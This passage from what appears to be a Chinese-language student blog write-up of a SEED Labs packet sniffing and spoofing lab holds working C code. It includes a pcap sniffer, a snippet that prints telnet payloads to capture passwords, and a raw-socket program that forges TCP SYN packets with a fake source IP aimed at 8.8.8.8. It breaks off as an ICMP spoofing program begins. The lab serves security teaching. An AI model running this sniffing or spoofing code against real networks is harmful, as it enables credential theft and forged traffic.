    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_setfilter</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">pcap_perror</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token string">"Error:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Step 4: Capture packets</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Starting packet capture... Filter: %s\n"</span><span class="token punctuation">,</span> filter_exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">pcap_loop</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> got_packet<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">pcap_close</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Close the handle</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2025/11/12/seedlab6/image-20251113203525512.png" alt="image-20251113203525512"></p>
<p><strong>Q1</strong><br>首先handle使用pcap_open_live打开一个活跃监听句柄，其次利用pcap_compile在监听句柄中编译一个过滤器语法，并在编译错误时结束程序；如果编译通过，则开始监听，直至程序退出。</p>
<p><strong>Q2</strong><br>因为如果任意权限用户都能够监听，将会导致安全危机与隐私泄露。当没有root权限时，进程将由于没有监听网络区域的存储器的访问权限，出现权限冲突而退出。</p>
<p><strong>Q3</strong></p>
<p>如果不开启混杂模式，只能接收发往主机IP的报文。若开启混杂模式，就算是在10.9.0.1上监听，也能监听到10.9.0.5发往10.9.0.6的报文。</p>
<h3 id="Task-2-1B-Writing-Filters"><a href="#Task-2-1B-Writing-Filters" class="headerlink" title="Task 2.1B: Writing Filters"></a>Task 2.1B: Writing Filters</h3><p>编写两个特殊的filter</p>
<p><strong>Capture the ICMP packets between two specific hosts</strong></p>
<p><strong>Capture the TCP packets with a destination port number in the range from 10 to 100</strong></p>
<p>只需要将2.1A的代码中的filter更改为如下即可。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> filter_exp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"icmp and (host 10.9.0.1 and host 10.9.0.5)"</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> filter_exp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"tcp dst portrange 10-100"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="Task-2-1C-Sniffing-Passwords"><a href="#Task-2-1C-Sniffing-Passwords" class="headerlink" title="Task 2.1C: Sniffing Passwords."></a>Task 2.1C: Sniffing Passwords.</h3><p>观察telnet协议数据段的位置。发现固定在报文第66字节，直接输出。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nGot a packet. Data:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t%s"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2025/11/12/seedlab6/image-20251117231322289.png" alt="image-20251117231322289"></p>
<h2 id="Task-2-2-Spoofing"><a href="#Task-2-2-Spoofing" class="headerlink" title="Task 2.2: Spoofing"></a>Task 2.2: Spoofing</h2><h3 id="Task-2-2A-Write-a-spoofing-program"><a href="#Task-2-2A-Write-a-spoofing-program" class="headerlink" title="Task 2.2A: Write a spoofing program."></a>Task 2.2A: Write a spoofing program.</h3><p>利用AI写了一个代码。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/ip.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/tcp.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span>

<span class="token comment">// IP Header structure</span>
<span class="token keyword">struct</span> <span class="token class-name">ipheader</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>      iph_ihl<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span> iph_ver<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>      iph_tos<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> iph_len<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> iph_ident<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> iph_flags<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">,</span> iph_offset<span class="token operator">:</span><span class="token number">13</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>      iph_ttl<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>      iph_protocol<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> iph_chksum<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">in_addr</span>     iph_sourceip<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">in_addr</span>     iph_destip<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// TCP Header structure</span>
<span class="token keyword">struct</span> <span class="token class-name">tcpheader</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> th_sport<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> th_dport<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span>       th_seq<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span>       th_ack<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>      th_x2<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">,</span> th_off<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>      th_flags<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> th_win<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> th_sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> th_urp<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// Pseudo header for TCP checksum calculation</span>
<span class="token keyword">struct</span> <span class="token class-name">pseudo_tcp</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> saddr<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> daddr<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> zero<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> protocol<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> tcp_length<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">tcpheader</span> tcp<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// Function to calculate checksum</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">int</span> nbytes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">register</span> <span class="token keyword">long</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> oddbyte<span class="token punctuation">;</span>
    <span class="token keyword">register</span> <span class="token keyword">short</span> answer<span class="token punctuation">;</span>

    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>nbytes <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        sum <span class="token operator">+=</span> <span class="token operator">*</span>ptr<span class="token operator">++</span><span class="token punctuation">;</span>
        nbytes <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>nbytes <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oddbyte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oddbyte<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> oddbyte<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sum <span class="token operator">+=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    answer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span><span class="token operator">~</span>sum<span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> answer<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> sd<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> sin<span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Create raw socket</span>
    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_RAW<span class="token punctuation">,</span> IPPROTO_RAW<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Enable IP_HDRINCL to manually construct IP header</span>
    <span class="token keyword">int</span> one <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">int</span> <span class="token operator">*</span>val <span class="token operator">=</span> <span class="token operator">&amp;</span>one<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> IPPROTO_IP<span class="token punctuation">,</span> IP_HDRINCL<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"setsockopt() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Set destination address</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token string">"8.8.8.8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Google DNS as destination</span>
    
    <span class="token comment">// Clear buffer</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Construct IP header</span>
    <span class="token keyword">struct</span> <span class="token class-name">ipheader</span> <span class="token operator">*</span>ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ipheader</span> <span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token punctuation">;</span>
    
    ip<span class="token operator">-></span>iph_ver <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token comment">// IPv4</span>
    ip<span class="token operator">-></span>iph_ihl <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment">// IP header length (5 * 4 = 20 bytes)</span>
    ip<span class="token operator">-></span>iph_tos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// Type of service</span>
    ip<span class="token operator">-></span>iph_len <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ipheader</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tcpheader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ip<span class="token operator">-></span>iph_ident <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">54321</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Identification</span>
    ip<span class="token operator">-></span>iph_flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// Fragmentation flags</span>
    ip<span class="token operator">-></span>iph_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// Fragment offset</span>
    ip<span class="token operator">-></span>iph_ttl <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>   <span class="token comment">// Time to live</span>
    ip<span class="token operator">-></span>iph_protocol <span class="token operator">=</span> IPPROTO_TCP<span class="token punctuation">;</span> <span class="token comment">// TCP protocol</span>
    ip<span class="token operator">-></span>iph_chksum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// Will calculate later</span>
    
    <span class="token comment">// Spoof source IP address (this is the spoofed part)</span>
    ip<span class="token operator">-></span>iph_sourceip<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token string">"1.2.3.4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Fake source IP</span>
    ip<span class="token operator">-></span>iph_destip<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr<span class="token punctuation">;</span>     <span class="token comment">// Real destination IP</span>
    
    <span class="token comment">// Calculate IP header checksum</span>
    ip<span class="token operator">-></span>iph_chksum <span class="token operator">=</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span>ip<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ipheader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Construct TCP header</span>
    <span class="token keyword">struct</span> <span class="token class-name">tcpheader</span> <span class="token operator">*</span>tcp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tcpheader</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buffer <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ipheader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    tcp<span class="token operator">-></span>th_sport <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Source port</span>
    tcp<span class="token operator">-></span>th_dport <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Destination port (HTTP)</span>
    tcp<span class="token operator">-></span>th_seq <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span><span class="token number">1234567</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Sequence number</span>
    tcp<span class="token operator">-></span>th_ack <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>               <span class="token comment">// Acknowledgement number</span>
    tcp<span class="token operator">-></span>th_off <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>               <span class="token comment">// Data offset (5 * 4 = 20 bytes)</span>
    tcp<span class="token operator">-></span>th_flags <span class="token operator">=</span> TH_SYN<span class="token punctuation">;</span>        <span class="token comment">// SYN flag</span>
    tcp<span class="token operator">-></span>th_win <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">5840</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Window size</span>
    tcp<span class="token operator">-></span>th_sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>               <span class="token comment">// Will calculate later</span>
    tcp<span class="token operator">-></span>th_urp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>               <span class="token comment">// Urgent pointer</span>
    
    <span class="token comment">// Calculate TCP checksum (requires pseudo header)</span>
    <span class="token keyword">struct</span> <span class="token class-name">pseudo_tcp</span> p_tcp<span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p_tcp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pseudo_tcp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    p_tcp<span class="token punctuation">.</span>saddr <span class="token operator">=</span> ip<span class="token operator">-></span>iph_sourceip<span class="token punctuation">.</span>s_addr<span class="token punctuation">;</span>
    p_tcp<span class="token punctuation">.</span>daddr <span class="token operator">=</span> ip<span class="token operator">-></span>iph_destip<span class="token punctuation">.</span>s_addr<span class="token punctuation">;</span>
    p_tcp<span class="token punctuation">.</span>zero <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    p_tcp<span class="token punctuation">.</span>protocol <span class="token operator">=</span> IPPROTO_TCP<span class="token punctuation">;</span>
    p_tcp<span class="token punctuation">.</span>tcp_length <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tcpheader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p_tcp<span class="token punctuation">.</span>tcp<span class="token punctuation">,</span> tcp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tcpheader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    tcp<span class="token operator">-></span>th_sum <span class="token operator">=</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p_tcp<span class="token punctuation">,</span> 
                                    <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pseudo_tcp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Send the spoofed packet</span>
    <span class="token keyword">int</span> total_len <span class="token operator">=</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>ip<span class="token operator">-></span>iph_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sendto</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> total_len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span> 
               <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"sendto() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Spoofed packet sent successfully!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Spoofed Source IP: 1.2.3.4\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Destination IP: 8.8.8.8\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Protocol: TCP\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Source Port: 12345\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Destination Port: 80\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"TCP Flags: SYN\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以自定义修改IP协议和TCP协议</p>
<p>通过wireshark捕捉到了我们伪造的报文。</p>
<p><img src="/2025/11/12/seedlab6/image-20251117233227547.png" alt="image-20251117233227547"></p>
<h3 id="Task-2-2B-Spoof-an-ICMP-Echo-Request"><a href="#Task-2-2B-Spoof-an-ICMP-Echo-Request" class="headerlink" title="Task 2.2B: Spoof an ICMP Echo Request."></a>Task 2.2B: Spoof an ICMP Echo Request.</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/ip.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/ip_icmp.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/time.h></span></span>

<span class="token comment">// Calculate checksum function</span>
